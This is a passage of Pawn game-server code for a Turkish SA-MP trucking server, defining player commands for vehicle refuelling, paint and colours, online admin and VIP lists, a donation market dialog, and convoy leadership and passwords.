	// Let the server know that this was a valid command
	return 1;
}
// Refuel the player's vehicle
CMD:vbenzin(playerid, params[])
{
	// Setup local variables
	new vID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fuel", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
			// Check if the player is inside a vehicle
			if (IsPlayerInAnyVehicle(playerid))
			{
			    // Get the vehicleid
			    vID = GetPlayerVehicleID(playerid);
			    // Refuel the vehicle
			    AVehicleData[vID][Fuel] = MaxFuel;
				// Let the player know about it
				SendClientMessage(playerid, 0x00FF00FF, "Your vehicle is refuelled");
			}
			else
				SendClientMessage(playerid, 0x00FF00FF, "You're not driving a vehicle");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Let the player use a jetpack
CMD:fly(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fly", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			// Equip the player with a jetpack
			SetPlayerSpecialAction(playerid, 2);
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Paints a car with a paintjob
CMD:paintjob(playerid, params[])
{
    // Setup local variables
	new paintjobid, vid;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/paintjob", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is the driver of the vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			if (sscanf(params, "i", paintjobid)) SendSyntaxMessage(playerid, "/paintjob <1-2>");
			else
			{
			    // Check if the player entered a correct paintjob-id
			    if ((paintjobid >= 0) && (paintjobid <= 2))
				{
					// Get the vehicle-id
					vid = GetPlayerVehicleID(playerid);
					// Check if the player is the owner of the vehicle
					if (AVehicleData[vid][Owned] == true)
					{
						// Change the paintjob of the player's vehicle
						ChangeVehiclePaintjob(vid, paintjobid);
						// Also save the paintjob for the vehicle
						AVehicleData[vid][PaintJob] = paintjobid + 1;

						// Also set the vehiclecolor to 1 (white), so the paintjob has it's full color
						ChangeVehicleColor(vid, 1, 1);
						// Also save the colors for the vehicle
						AVehicleData[vid][Color1] = 1;
						AVehicleData[vid][Color2] = 1;

						// Let the player pay for the paintjob
						RewardPlayer(playerid, -500, 0);
						// Inform the player about it
						SendClientMessage(playerid, 0x00FF00FF, "You repainted your vehicle for $500");
						// Save the player-file (along with the houses and businesses)
						Oyuncu_Kaydet(playerid);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "You're not the owner of the vehicle");
				}
				else
				    SendClientMessage(playerid, 0xFF0000AA, "You need to enter a paintjob-id from 0 to 2");
			}
		}
		else
			SendClientMessage(playerid, 0xFF0000FF, "You must be inside a vehicle you own to apply a paintjob");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Re-colors the given vehicle (lets you choose the first color)
CMD:arenk1(playerid, params[])
{
	// Setup local variables
	new ColorList[1000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/arenk1", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is the driver of the vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Check if the player is the owner of the vehicle
			if (Araclar[GetPlayerVehicleID(playerid)][AracInSHP] == true && !strcmp(AracSHP[ Araclar[GetPlayerVehicleID(playerid)][AracSHPID] ][ASHPSahip], GetName(playerid), true))
			{
				// Construct the colorlist
				format(ColorList, sizeof(ColorList), "%s{FFFFFF}%s\n", ColorList, "Siyah (Paintjob Siler)"); // Color 0
				format(ColorList, sizeof(ColorList), "%s{FFFFFF}%s\n", ColorList, "Beyaz"); // Color 1

				for (new i = 2; i < sizeof(AVehicleColors); i++)
					format(ColorList, sizeof(ColorList), "%s%s%s\n", ColorList, AVehicleColors[i], "Araç Rengi");

				// Show the dialog with all the colors
				ShowPlayerDialog(playerid, DialogPrimaryCarColor, DIALOG_STYLE_LIST, "1. Rengi Seç:", ColorList, "Seç", "Ýptal");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu aracýn sahibi siz deðilsiniz!");
		}
		else
			SendClientMessage(playerid, 0xFF0000FF, "Renk deðiþtirebilmek için araç içinde olmanýz gerekiyor!");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Re-colors the given vehicle (lets you choose the first color)
CMD:arenk2(playerid, params[])
{
	// Setup local variables
	new ColorList[1000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/arenk2", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is the driver of the vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Check if the player is the owner of the vehicle
			if (Araclar[GetPlayerVehicleID(playerid)][AracInSHP] == true && !strcmp(AracSHP[ Araclar[GetPlayerVehicleID(playerid)][AracSHPID] ][ASHPSahip], GetName(playerid), true))
			{
				// Construct the colorlist
				format(ColorList, sizeof(ColorList), "%s{FFFFFF}%s\n", ColorList, "Siyah"); // Color 0
				format(ColorList, sizeof(ColorList), "%s{FFFFFF}%s\n", ColorList, "Beyaz"); // Color 1

				for (new i = 2; i < sizeof(AVehicleColors); i++)
					format(ColorList, sizeof(ColorList), "%s%s%s\n", ColorList, AVehicleColors[i], "Araç Rengi");

				// Show the dialog with all the colors
				ShowPlayerDialog(playerid, DialogSedundaryCarColor, DIALOG_STYLE_LIST, "2. Rengi Seç:", ColorList, "Seç", "Ýptal");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu aracýn sahibi siz deðilsiniz!");
		}
		else
			SendClientMessage(playerid, 0x00FF00FF, "Renk deðiþtirmek için araç içinde olmanýz gerekiyor!");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
/*
// Starts or stops the engine of your vehicle
CMD:engine(playerid, params[])
{
    // Setup local variables
	new vehicleid, engine,lights,alarm,doors,bonnet,boot,objective;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/engine", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			// Get the player's vehicle
			vehicleid = GetPlayerVehicleID(playerid);

			// Get the current status of the vehicle
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);

			// Check if the player is inside a vehicle
			if (vehicleid != 0)
			{
				if (sscanf(params, "i", engine)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/engine <EngineStatus (0/1)>\"");
				else
				{
					// Set the engine to the value that was passed by the player and leave all other parameters alone
					SetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
					MotorMOD[vehicleid] = engine;
				}
			}
			else
				SendClientMessage(playerid, 0x00FF00FF, "You must be inside a vehicle to toggle your engine");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
*/
// Asks which vehicle parameter you wanna toggle
CMD:caroption(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/caroption", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1 || VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
			// Let the player select a weather-type
			ShowPlayerDialog(playerid, DialogCarOption, DIALOG_STYLE_LIST, "Bir islem seciniz:", "Motor\nFarlar\nAlarm\nKapilar\nKaput\nBagaj\nIsaret", "Yap", "iptal");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Sets the global weather
CMD:weatherisikem(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/weather", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
			// Let the player select a weather-type
			ShowPlayerDialog(playerid, DialogWeather, DIALOG_STYLE_LIST, "Select weather type:", "Normal\nStormy\nFoggy\nScorching Hot\nDull, cloudy, rainy\nSandstorm\nGreen Fog\nDark, cloudy, brown\nExtremely bright\nDark toxic clouds\nBlack & white sky", "Select", "Cancel");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:musait(playerid, params[])
{
    // Send the command to all admins so they can see it
	SendAdminText(playerid, "/musait", params);

	if(APlayerData[playerid][PlayerLevel] == 0 && Root[playerid] == 0 && APlayerData[playerid][PlayerRehberLevel] == 0) return 0;
	new Yazi[300];
	if(Musait[playerid] == true)
	{
	    format(Yazi, 300, "{48D1CC}ADMIN %s, {F8F8FF}durumunu {FF4040}Müsait Deðil {F8F8FF}olarak deðiþtirdi. Kendisini rahatsýz etmeyin.", GetName(playerid));
	    SendClientMessageToAll(-1, Yazi);
	    Musait[playerid] = false;
	}else{
	    format(Yazi, 300, "{48D1CC}ADMIN %s, {F8F8FF}durumunu {FF4040}Müsait {F8F8FF}olarak deðiþtirdi. Artýk sizle ilgilenebilir.", GetName(playerid));
	    SendClientMessageToAll(-1, Yazi);
	    Musait[playerid] = true;
	}
	return 1;
}

// This command lists all online admins
CMD:admins(playerid, params[])
{
    // Send the command to all admins so they can see it
	SendAdminText(playerid, "/admins", params);

	new AdminList[2000], YSayi;
    format(AdminList, 2000, "%sYetkili\tYetkisi\tMüsaitlik Durumu\n", AdminList);
	foreach(new i:Player)
	{
		if(APlayerData[i][PlayerLevel] == 7)
	    {
	        YSayi++;  AfkDurum[playerid] = 1;
			if(Musait[i] == true) format(AdminList, 2000, "%s{%06x}%s(%d)\t{FFC000}SAHIP ADMIN\t{ADFF2F}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i);
			if(Musait[i] == false) format(AdminList, 2000, "%s{%06x}%s(%d)\t{FFC000}SAHIP ADMIN\t{FF4040}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i);
	    }else
	    if(APlayerData[i][PlayerLevel] >= 1)
	    {
	        YSayi++;
			if(Musait[i] == true) format(AdminList, 2000, "%s{%06x}%s(%d)\t{4867FF}%d Level Admin\t{ADFF2F}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i, APlayerData[i][PlayerLevel]);
			if(Musait[i] == false) format(AdminList, 2000, "%s{%06x}%s(%d)\t{4867FF}%d Level Admin\t{FF4040}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i, APlayerData[i][PlayerLevel]);
	    }
	}

	format(AdminList, 2000, "%s{DDDDDD}Oyunda {FFC000}%d {DDDDDD}yetkili bulunmaktadýr\n", AdminList, YSayi);
	format(AdminList, 2000, "%s{ADFF2F} = Müsait\n", AdminList);
	format(AdminList, 2000, "%s{FF4040} = Müsait Deðil\n", AdminList);
	format(AdminList, 2000, "%s{FFEE00} = AFK\n", AdminList);
	format(AdminList, 2000, "%s{DDDDDD}Müsait olmayan yetkilileri rahatsýz etmeyiniz\n", AdminList);
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST_HEADERS, "{FF4040}Yetkili Listesi", AdminList, "Kapat", "");
	return 1;
}
CMD:market(playerid, params[])
{
    // Send the command to all admins so they can see it
	SendAdminText(playerid, "/market", params);

	new AdminList[2000];
    format(AdminList, 2000, "%sÜrün\tFiyat\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}3 Aylýk VIP \t{B0FF41}15 	TL\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Þirket 10 Kiþilik \t{B0FF41}20 TL\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Þirket 20 Kiþilik \t{B0FF41} 30 TL\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Þirket 30 Kiþilik \t{B0FF41}40 TL\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Donator \t{B0FF41}10 TL\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Para,skor gibi ürünleri Almak isterseniz Forumdaki Marketimize Ziyaret edin.\n", AdminList);
    format(AdminList, 2000, "%s{00F7FF}\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Satýn Almak Ýçin \t{B0FF41}www.canakkalefr.com\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Ödeme Yöntemi \t{B0FF41}Tüm Ödeme Yöntemleri Geçerlidir\n", AdminList);
	format(AdminList, 2000, "%s{00F7FF}Sitemizde Bakiye Ekleyice Otomatik Seçtiniz Ürün teslim olur.\n", AdminList);
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FF4040}Canakkale Mekaný Market", AdminList, "Kapat", "");

	return 1;
}
CMD:rehberler(playerid, params[])
{
    // Send the command to all admins so they can see it
	SendAdminText(playerid, "/rehberler", params);

	new AdminList[2000], RSayi;
    format(AdminList, 2000, "%sYetkili\tYetkisi\tMüsaitlik Durumu\n", AdminList);
	foreach(new i:Player)
	{
	    if(APlayerData[i][PlayerRehberLevel] >= 1)
	    {
	        RSayi++;
			if(Musait[i] == true) format(AdminList, 2000, "%s{%06x}%s(%d)\t{4867FF}(R %d) REHBER \t{ADFF2F}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i, APlayerData[i][PlayerRehberLevel]);
			if(Musait[i] == false) format(AdminList, 2000, "%s{%06x}%s(%d)\t{4867FF}(R %d) REHBER \t{FF4040}\n", AdminList, GetPlayerColor(i) >>> 8, GetName(i), i, APlayerData[i][PlayerRehberLevel]);
	    }
	}

	format(AdminList, 2000, "%s{DDDDDD}Oyunda {FFC000}%d {DDDDDD}rehber bulunmaktadýr\n", AdminList, RSayi);
	format(AdminList, 2000, "%s{ADFF2F} = Müsait\n", AdminList);
	format(AdminList, 2000, "%s{FF4040} = Müsait Deðil\n", AdminList);
	format(AdminList, 2000, "%s{DDDDDD}Müsait olmayan rehberleri rahatsýz etmeyiniz\n", AdminList);
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FF4040}Rehber Listesi", AdminList, "Kapat", "");
	return 1;
}

CMD:yonetim(playerid, params[])
{
	new DiaYazi[2000], Satir[80], SatirKisalt[80], bool:IlkBaslik;
	SendAdminText(playerid, "/yonetim", params);
	IlkBaslik = true;

	if(APlayerData[playerid][LoggedIn] == true)
	{
		if(!fexist("ServerData/Kadro.ini")) return SendClientMessage(playerid, -1, "{FF0000}Sunucu kadrosuna geçici olarak ulaþýlamýyor! Lütfen sonra tekrar deneyin.");
		new File:KadroDosya = fopen("ServerData/Kadro.ini", io_read);

		while(fread(KadroDosya, Satir))
		{
		    if(Satir[0] == '-')
		    {
		        strmid(SatirKisalt, Satir, 1, strlen(Satir), 79);

		        if(IlkBaslik == true)
		        {
		        	format(DiaYazi, 2000, "%s{00CED1}%s", DiaYazi, SatirKisalt);
					IlkBaslik = false;
				}else{
				    format(DiaYazi, 2000, "%s \n{00CED1}%s", DiaYazi, SatirKisalt);
				}
			}else{
		        format(DiaYazi, 2000, "%s{ADFF2F}%s", DiaYazi, Satir);
		    }
		}

		fclose(KadroDosya);

		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{80FFFF}Týrcýlar Mekaný Yönetim Kadrosu", DiaYazi, "Kapat", "");
	}
	return 1;
}

// This command lists all online admins
CMD:djler(playerid, params[])
{
	// Setup local variables
	new AdminList[500], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/djler", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    format(AdminList, 500, "ID\tNick\tDj Level\n");

		// Scan through all players
		for (new i; i < MAX_PLAYERS; i++)
		{
			// Check if this player is connected
			if (IsPlayerConnected(i))
			{
				// Get the name of the player
				GetPlayerName(i, Name, sizeof(Name));

				/*
				// Check if this player is an RCON admin
				if (IsPlayerAdmin(i))
				{
					// Add all admin players to the list
					format(AdminList, 500, "%s%s: %s (id: %i), admin-level: %i (RCON admin)\n", AdminList, AdminLevelName[APlayerData[i][PlayerLevel]], Name, i, APlayerData[i][PlayerLevel]); // Add the name of the admin-player to the list
					// Re-start the for loop (skipping the remaining code for this iteration)
					continue;
				}
				*/
				//Check if that player is an admin (using the PlayerLevel)
				if (APlayerData[i][PlayerDjLevel] > 0)
				{
					// Add all admin players to the list
					//format(AdminList, 500, "%s%s: %s (id: %i), admin-level: %i\n", AdminList, AdminLevelName[APlayerData[i][PlayerLevel]], Name, i, APlayerData[i][PlayerLevel]); // Add the name of the admin-player to the list
					format(AdminList, 500, "%s%d\t%s\t%d\n", AdminList, i, Name, APlayerData[i][PlayerDjLevel]);
				}
			}
		}

		// Check if there were admin-names added to the list
		if (strlen(AdminList) > 0)
			ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_TABLIST_HEADERS, "Online DJler:", AdminList, "Kapat", "");
		    //ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_LIST, "Online Yöneticiler:", AdminList, "Kapat", "");
		else
			SendClientMessage(playerid, 0xFF0000FF, "Oyunda DJ yok"); // No admins are online
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:vipler(playerid, params[])
{
	// Setup local variables
	new AdminList[1250], Name[24];
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/vipler", params);
	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    format(AdminList, 500, "ID\tNick\tVip  Bitiþ Tarih \t Bitiþ Saat\n");

		// Scan through all players
		for (new i; i < MAX_PLAYERS; i++)
		{
			// Check if this player is connected
			if (IsPlayerConnected(i))
			{
				// Get the name of the player
				GetPlayerName(i, Name, sizeof(Name));

				/*
				// Check if this player is an RCON admin
				if (IsPlayerAdmin(i))
				{
					// Add all admin players to the list
					format(AdminList, 500, "%s%s: %s (id: %i), admin-level: %i (RCON admin)\n", AdminList, AdminLevelName[APlayerData[i][PlayerLevel]], Name, i, APlayerData[i][PlayerLevel]); // Add the name of the admin-player to the list
					// Re-start the for loop (skipping the remaining code for this iteration)
					continue;
				}
				*/
				//Check if that player is an admin (using the PlayerLevel)
				if (VIP[i] >= 1)
				{
				    	new year, month, day, hour, VBParca[4][10];
						split(VIPBitis[i], VBParca, '.');
   						 day = strval(VBParca[0]);
						month = strval(VBParca[1]);
						year = strval(VBParca[2]);
						hour = strval(VBParca[3]);
					// Add all admin players to the list
					//format(AdminList, 500, "%s%s: %s (id: %i), admin-level: %i\n", AdminList, AdminLevelName[APlayerData[i][PlayerLevel]], Name, i, APlayerData[i][PlayerLevel]); // Add the name of the admin-player to the list
					format(AdminList, 500, "%s%d\t%s\t%d.%d.%d \t Saat %d.00\n", AdminList, i, Name, day, month, year, hour);
				}
			}
		}

		// Check if there were admin-names added to the list
		if (strlen(AdminList) > 0)
			ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_TABLIST_HEADERS, "Online VIP ler:", AdminList, "Kapat", "");
		    //ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_LIST, "Online Yöneticiler:", AdminList, "Kapat", "");
		else
			SendClientMessage(playerid, 0xFF0000FF, "Oyunda VIP yok"); // No admins are online
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command lists all commands for normal players (admin-level 0)
CMD:komutlar(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/komutlar", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		CommandList_Create(playerid); // Create a list of commands (only the first 4 commands) and show the dialog
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:convoy(playerid, params[])
{
	// Setup local variables
	new ConvoyList[3000], Name[60], NumMembers, ConvoyStatus[50], Tur[50];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoy", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    format(ConvoyList, sizeof(ConvoyList), "Lider\tÜye Sayýsý\tTür\tDurum\n");
		// Create the list of convoys with all their data
		for (new i; i < MAX_CONVOYS; i++)
		{
		    // Check if this is an empty convoy (not created yet by a player)
			if (AConvoys[i][Status] == CONVOY_EMPTY)
			{
				// Setup data for an empty convoy (one which hasn't been chosen yet)
				NumMembers = 0;
				format(Name, 60, "{F8F8FF}YOK");
				format(ConvoyStatus, 50, "{F8F8FF}BOS");
				format(Tur, 50, "{F8F8FF}-");
			}
			else
			{
				// Get the name of the convoy-leader
				GetPlayerName(AConvoys[i][Members][0], Name, sizeof(Name));
				format(Name, 60, "%s(%d)", Name, AConvoys[i][Members][0]);
				// Calculate the members in the convoy
				NumMembers = Convoy_CountMembers(i);
				// Set the status of the convoy
				switch (AConvoys[i][Status])
				{
					case CONVOY_OPEN:
					{
					    if(AConvoys[i][ConvoySifreli] == true)
					    {
					        format(ConvoyStatus, 50, "{FFC000}SIFRELI");
					    }else{
					        format(ConvoyStatus, 50, "{00FF00}ACIK");
					    }
					}
					case CONVOY_FULL: format(ConvoyStatus, 50, "{FF0000}FULL");
					case CONVOY_CLOSED: format(ConvoyStatus, 50, "{FF0000}KAPALI");
				}
   				switch(APlayerData[ AConvoys[i][Members][0] ][PlayerClass])
				{
			    	case ClassTruckDriver: format(Tur, 50, "{FFFF00}KAMYON");
			    	case ClassBusDriver: format(Tur, 50, "{FFC000}OTOBÜS");
				}
			}

			// Put all data together to form the content of the entire dialog
						// Put all data together to form the content of the entire dialog
			format(ConvoyList, sizeof(ConvoyList), "%s%s\t%d\t%s\t%s\n", ConvoyList, Name, NumMembers, Tur, ConvoyStatus);
		}

		// Show the dialog
		ShowPlayerDialog(playerid, DialogSelectConvoy, DIALOG_STYLE_TABLIST_HEADERS, "Convoy Listesi:", ConvoyList, "Tamam", "Cancel");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:convoybilgi(playerid, params[])
{
	// First create some new variables
	new Convoy, LeaderID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoybilgi", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID]; // Get the convoy of the player
		LeaderID = AConvoys[Convoy][Members][0]; // Get the leader of his convoy

		// Check if this player is part of a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Check if this player is the leader of the convoy
			if (LeaderID == playerid)
			{
                AConvoys[Convoy][LeaderInformedTrailers] = false;
                SendClientMessage(playerid, -1, "{F8F8FF}Konvoy görevi baþlattýnýz fakat herkes hazýr deðilse");
                SendClientMessage(playerid, -1, "{F8F8FF}kimlerin hazýr olmadýðýný birazdan tekrar görebileceksiniz.");
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Konvoyun lideri deðilsin");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Konvoyun lideri olmalýsýn");
	}
	else
		return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:convoylider(playerid, params[])
{
	// First create some new variables
	new Convoy, LeaderID, OtherPlayer, LeaderName[MAX_PLAYER_NAME], MemberName[MAX_PLAYER_NAME], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoylider", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID]; // Get the convoy of the player
		LeaderID = AConvoys[Convoy][Members][0]; // Get the leader of his convoy

		// Check if this player is part of a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Check if this player is the leader of the convoy
			if (LeaderID == playerid)
			{
				if (sscanf(params, "u", OtherPlayer)) SendClientMessage(playerid, 0xFF0000AA, "Kullaným : \"/convoyleader <Oyuncu ID>\"");
				else
				{
					// Check if that other player is part of the convoy
					if ((APlayerData[OtherPlayer][InConvoy] == true) && (APlayerData[OtherPlayer][ConvoyID] == Convoy))
					{
						// Get the index of the old leader
						for (new x = 1; x < CONVOY_MAX_MEMBERS; x++)
						{
							if (AConvoys[Convoy][Members][x] == -1)
								continue;

							// set the new indexes
							if (AConvoys[Convoy][Members][x] == OtherPlayer) {
								//TextDrawHideForPlayer(OtherPlayer, AConvoys[Convoy][ConvoyTextMember]);
								AConvoys[Convoy][Members][0] = OtherPlayer;
								//TextDrawHideForPlayer(playerid, AConvoys[Convoy][ConvoyTextLeader]);
								AConvoys[Convoy][Members][x] = playerid;
							}
						}

						// Get the names of the old and new leader
						GetPlayerName(playerid, LeaderName, sizeof(LeaderName));
						GetPlayerName(OtherPlayer, MemberName, sizeof(MemberName));
						// Inform the old leader that he gave away his leadership
						format(Msg, 128, "Oyuncu {0000FF}%s{00FF00} Yeni Lider yaptin", MemberName);
						SendClientMessage(playerid, 0x00FF00FF, Msg);
						// Inform the new leader that he has received leadership
						format(Msg, 128, "Eski Lider{0000FF}%s{00FF00} Size Liderligi verdi", LeaderName);
						SendClientMessage(OtherPlayer, 0x00FF00FF, Msg);
					}
					else
					    SendClientMessage(playerid, 0xFF0000FF, "Konvoyunda olmayan birini lider yapamazsýn");
				}
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Konvoyun lideri deðilsin");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Konvoyun lideri olmalýsýn");
	}
	else
		return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:convoysifre(playerid, params[])
{
	new Convoy, CSifre[100], LeaderID, Yazi[256];

	SendAdminText(playerid, "/convoysifre", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID];
		LeaderID = AConvoys[Convoy][Members][0];

		if (APlayerData[playerid][InConvoy] == true)
		{
			if (LeaderID == playerid)
			{
			    if(VIP[playerid] < 1 && YVIP[playerid] == 0) return SendClientMessage(playerid, 0xFF0000FF, "Bu komutu sadece VIP oyuncular kullanabilir!");
				if (sscanf(params, "s", CSifre)) SendSyntaxMessage(playerid, "/convoysifre <Þifre>");
				else
				{
				    AConvoys[Convoy][ConvoySifreli] = true;
					format(AConvoys[Convoy][ConvoySifre], 100, CSifre);

					format(Yazi, 256, "{F8F8FF}Konvoya giriþi þifreli yaptýnýz. Konvoy þifreniz: {ADFF2F}%s", CSifre);
					SendClientMessage(playerid, -1, Yazi);
					SendClientMessage(playerid, -1, "{F8F8FF}Konvoyu kapattýðýnýzda veya liderliði VIP olmayan birine devrettiðinizde bu þifre kalkar.");
                    SendClientMessage(playerid, -1, "{00CED1}/convoysifrekaldir {F8F8FF}yazarak konvoy þifresini kaldýrabilirsiniz.");
				}
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Konvoy þifresini deðiþtirmek için konvoy lideri olmanýz gerekiyor!");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Konvoy þifresini deðiþtirmek için konvoy lideri olmanýz gerekiyor!");
	}
	else
		return 0;

	return 1;
}

CMD:convoysifrekaldir(playerid, params[])
{
	new Convoy, CSifre[100], LeaderID;

	SendAdminText(playerid, "/convoysifrekaldir", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID];
		LeaderID = AConvoys[Convoy][Members][0];

		if (APlayerData[playerid][InConvoy] == true)
		{
			if (LeaderID == playerid)
			{
			    if(VIP[playerid] < 1 && YVIP[playerid] == 0) return SendClientMessage(playerid, 0xFF0000FF, "Bu komutu sadece VIP oyuncular kullanabilir!");
				AConvoys[Convoy][ConvoySifreli] = false;
				format(AConvoys[Convoy][ConvoySifre], 100, CSifre);

				SendClientMessage(playerid, -1, "{F8F8FF}Konvoy þifresini kaldýrdýnýz.");
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Konvoy þifresini deðiþtirmek için konvoy lideri olmanýz gerekiyor!");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Konvoy þifresini deðiþtirmek için konvoy lideri olmanýz gerekiyor!");
	}
	else
		return 0;

	return 1;
}

// Allows the leader to kick a member from the convoy
CMD:convoyat(playerid, params[])
{
	// Setup local variables
	new Convoy, LeaderID, OtherPlayer, LeaderName[24], MemberName[24], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoyat", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID]; // Get the convoy of the player
		LeaderID = AConvoys[Convoy][Members][0]; // Get the leader of his convoy

		// Check if this player is part of a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Check if this player is the leader of the convoy
			if (LeaderID == playerid)
			{
				if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/convoyat <ID>");
				else
				{
					// Check if that other player is part of the convoy
					if ((APlayerData[OtherPlayer][InConvoy] == true) && (APlayerData[OtherPlayer][ConvoyID] == Convoy))
					{
					    // Kick the other player from the convoy
						Convoy_Leave(OtherPlayer);
						// Get the names of the leader and member
						GetPlayerName(playerid, LeaderName, sizeof(LeaderName));
						GetPlayerName(OtherPlayer, MemberName, sizeof(MemberName));
						// Inform the leader that he has kicked the other player
						format(Msg, 128, "You've kicked {0000FF}%s{00FF00} from the convoy", MemberName);
						SendClientMessage(playerid, 0x00FF00FF, Msg);
						// Inform the leader that he has kicked the other player
						format(Msg, 128, "Lider {0000FF}%s{00FF00} sizi Convoydan kickledi", LeaderName);
